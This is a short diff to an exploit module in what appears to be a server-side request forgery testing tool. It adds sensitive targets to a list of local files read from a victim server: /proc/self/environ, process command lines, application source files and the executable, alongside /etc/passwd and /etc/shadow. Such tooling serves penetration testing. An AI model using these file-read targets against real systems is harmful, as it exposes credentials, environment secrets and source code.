@@ -8,7 +8,7 @@ author        = "Swissky"
 documentation = []
 
 class exploit():
-    files = ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd"]
+    files = ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/cwd/index.php", "/proc/self/cwd/application.py", "/proc/self/cwd/main.py", "/proc/self/exe"]
 
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
